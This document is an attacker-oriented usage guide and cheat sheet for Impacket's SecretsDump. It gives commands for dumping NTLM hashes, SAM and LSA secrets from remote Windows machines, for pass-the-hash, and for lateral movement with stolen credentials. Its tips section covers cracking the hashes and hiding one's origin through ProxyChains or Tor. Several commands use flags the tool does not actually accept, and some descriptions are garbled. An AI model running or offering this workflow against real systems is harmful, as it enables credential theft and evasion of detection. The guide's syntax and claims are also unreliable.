# SecretsDump

**Type:** Credential Dumping Tool
**Focus:** **SecretsDump** is part of the **Impacket** toolkit and is used for dumping **credentials** (like **NTLM hashes**, **LM hashes**, **passwords**) from Windows systems. It works by leveraging **NTLM hashes**, **Kerberos tickets**, and **LSA Secrets** to extract sensitive information. It’s commonly used in post-exploitation scenarios to escalate privileges and for **pass-the-hash** attacks.

---

## 1. Full Feature Overview

* **Extract NTLM Hashes**: SecretsDump allows you to dump **NTLM** and **LM** hashes from a target system.
* **Dump LSA Secrets**: It can extract **Local Security Authority (LSA) Secrets** which store password-related information.
* **Kerberos Tickets**: It can extract **Kerberos tickets** (TGTs, TGS) from the target system.
* **SAM Database Extraction**: SecretsDump allows you to dump the **SAM (Security Account Manager) database**, which contains password hashes.
* **Supports Remote & Local Attacks**: Works with both **remote SMB** connections and **local** access.
* **Credential Reuse**: Extracted credentials can be reused for further lateral movement or post-exploitation activities.

---

## 2. Requirements & Setup

### Requirements

* **Impacket Library**: **SecretsDump** is part of the **Impacket** library, so you need to have **Impacket** installed.
* **SMB/NetSession Access**: SMB and **NetSession** access is required on the target system to dump credentials remotely. In some cases, local access (e.g., via physical access or RDP) is needed to dump credentials.
* **Windows Credentials**: To execute **SecretsDump** remotely, you will need valid **Windows credentials** on the target system.

### Installation

1. **Install Impacket**:

   To install **Impacket** (which includes **SecretsDump**), clone the repository from GitHub:

   ```bash
   git clone https://github.com/SecureAuthCorp/impacket.git
   cd impacket
   python3 setup.py install
   ```

2. **Install Dependencies**:

   Make sure you have the required dependencies installed:

   ```bash
   pip install -r requirements.txt
   ```

---

## 3. Core Usage

### 3.1 Basic Syntax

The basic syntax for running **SecretsDump** is as follows:

```bash
secretsdump.py -target <target_ip> -user <username> -password <password> [-hashes <LM_hash>:<NTLM_hash>] [-domain <domain>]
```

**Example**:

```bash
secretsdump.py -target 192.168.1.10 -user Administrator -password password123 -domain example.com
```

This will dump the **NTLM hashes**, **SAM**, and **LSA Secrets** from the target machine **192.168.1.10** using the provided credentials for **Administrator**.

### 3.2 Dump Hashes and LSA Secrets

To dump **hashes** and **LSA Secrets** from a remote machine:

```bash
secretsdump.py -target 192.168.1.10 -user Administrator -password password123 -domain example.com
```

This command will output NTLM and LM hashes, LSA secrets, and other information about the account.

### 3.3 Dump SAM Database

You can dump the **SAM database** directly from a remote machine:

```bash
secretsdump.py -target 192.168.1.10 -user Administrator -password password123 -sam
```

This command will directly access the **SAM** database and extract the stored hashes.

### 3.4 Use Kerberos Tickets

If you have a **Kerberos TGT** or **TGS** (Ticket Granting Ticket / Ticket Granting Service), you can extract credentials from those tickets:

```bash
secretsdump.py -target 192.168.1.10 -user Administrator -k -domain example.com -tickets <kerberos_ticket_file>
```

This will extract credentials from the provided Kerberos tickets.

### 3.5 Use Hashes for Authentication (Pass-the-Hash)

If you already have **NTLM hashes** and wish to perform the dump without knowing the plaintext password, you can use the hashes for authentication:

```bash
secretsdump.py -target 192.168.1.10 -user Administrator -hashes <LM_hash>:<NTLM_hash> -domain example.com
```

This allows you to perform **pass-the-hash** attacks without needing the password.

---

## 4. Tips, Tricks, Best Practices

* **NTLM Hashes for Lateral Movement**: If you dump **NTLM hashes** from one system, you can use them for **lateral movement** and authentication on other systems that use the same credentials.
* **Kerberos Ticket Extraction**: If you're performing an **offline attack**, you can extract **Kerberos tickets** and use them to attempt **ticket renewal** or **brute-force attacks** to crack service tickets.
* **LSA Secrets**: LSA Secrets may contain cached credentials and other sensitive data. Dumping them can provide more valuable information about user accounts or applications with elevated privileges.
* **Crack Hashes**: Once you have **NTLM** or **LM hashes**, you can use tools like **Hashcat** or **John the Ripper** to attempt to crack the passwords.
* **Use ProxyChains**: To avoid detection or hide your origin during the dump, use **ProxyChains** or route traffic through **VPN** or **Tor**.

---

## 5. Cheat Sheet

```bash
# Basic syntax for dumping credentials
secretsdump.py -target <target_ip> -user <username> -password <password> -domain <domain>

# Dump hashes and LSA secrets from target
secretsdump.py -target 192.168.1.10 -user Administrator -password password123 -domain example.com

# Dump SAM database directly
secretsdump.py -target 192.168.1.10 -user Administrator -password password123 -sam

# Use Kerberos ticket to dump credentials
secretsdump.py -target 192.168.1.10 -user Administrator -k -domain example.com -tickets <kerberos_ticket_file>

# Use NTLM hashes for pass-the-hash attack
secretsdump.py -target 192.168.1.10 -user Administrator -hashes <LM_hash>:<NTLM_hash> -domain example.com
```

---
